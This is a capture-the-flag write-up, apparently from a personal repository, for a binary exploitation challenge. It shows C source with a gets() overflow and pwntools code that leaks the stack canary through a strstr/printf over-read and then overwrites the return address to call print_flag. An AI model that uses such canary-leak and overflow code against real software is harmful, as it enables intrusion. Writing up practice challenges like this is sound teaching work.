# Exploration

for this challenge we are given the following binary  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/4f2e66bc-9b9b-4fab-8c76-6b90ccf50988)

Looking at the security measures we get the following:  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/ff6cf893-9220-405a-bb45-e0a1b84e01c0) 

Let's look at the source code to see if we can find anything interesting  
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

void print_flag(void) {
  char flag[256];
  FILE *flag_file = fopen("flag.txt", "r");
  fgets(flag, sizeof flag, flag_file);
  puts(flag);
}

const char *const responses[] = {"L",
                                 "amongus",
                                 "true",
                                 "pickle",
                                 "GINKOID",
                                 "L bozo",
                                 "wtf",
                                 "not with that attitude",
                                 "increble",
                                 "based",
                                 "so true",
                                 "monka",
                                 "wat",
                                 "monkaS",
                                 "banned",
                                 "holy based",
                                 "daz crazy",
                                 "smh",
                                 "bruh",
                                 "lol",
                                 "mfw",
                                 "skissue",
                                 "so relatable",
                                 "copium",
                                 "untrue!",
                                 "rolled",
                                 "cringe",
                                 "unlucky",
                                 "lmao",
                                 "eLLe",
                                 "loser!",
                                 "cope",
                                 "I use arch btw"};

int main(void) {
  setbuf(stdout, NULL);
  srand(time(NULL));
  char input[64];
  puts("hello");
  while (1) {
    gets(input);
    char *s = strstr(input, "i'm");
    if (s) {
      printf("hi %s, i'm aplet123\n", s + 4);
    } else if (strcmp(input, "please give me the flag") == 0) {
      puts("i'll consider it");
      sleep(5);
      puts("no");
    } else if (strcmp(input, "bye") == 0) {
      puts("bye");
      break;
    } else {
      puts(responses[rand() % (sizeof responses / sizeof responses[0])]);
    }
  }
}
```

Some things of interest:  
1. There is a `print_flag` function, so we only need to gain control of the program flow to get the flag
2. were using the `strstr` in conjunction with `printf` to print the characters after the string "i'm"
3. we are using the function `gets` for input >:(

From this observations we know that there is a buffer overflow due to `gets`, but we can't abuse it straight away due to the stack canary.  
Some interesting behavior is that there is no check on what `s` points to after `strstr` so we can potentially access outside of the buffer.  
These two facts together should be enough to exploit this program.  

# Exploitation  

Plan:  
1. use `strstr` + `printf` to leak the stack canary
2. use gets + leaked stack canary to do a buffer overflow and overwrite the return address with `print_flag`

Through debugging with GDB, and accounting for the fact that stack canaries always start with 0x00, we can find the correct offset for the canary leak  
There's also some formatting needed  
```python
payload = b'A'*69 + b"i'm"
io.recvline()
io.sendline(payload)

data = io.recvline()
log.info(len(data))
log.info(data[2:][:9])
canary = data[2:][:8]

new_canary = b'\x00' + canary[1:]

for byte in new_canary[::-1]:
    print(hex(byte), end=' ')

new_canary = new_canary[::-1]
int_canary = int.from_bytes(new_canary)
```
Then we can use the leaked canary to perform a basic buffer overflow
```python
ovf = 72*b'A' + p64(int_canary) + 8*b'A' +p64(exe.sym['print_flag'])
log.success(hex(exe.sym['print_flag']))

io.sendline(ovf)
io.sendline(b"bye")
```

That's it :)  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/aa60476a-c492-475e-b36b-ff20e56e446e)



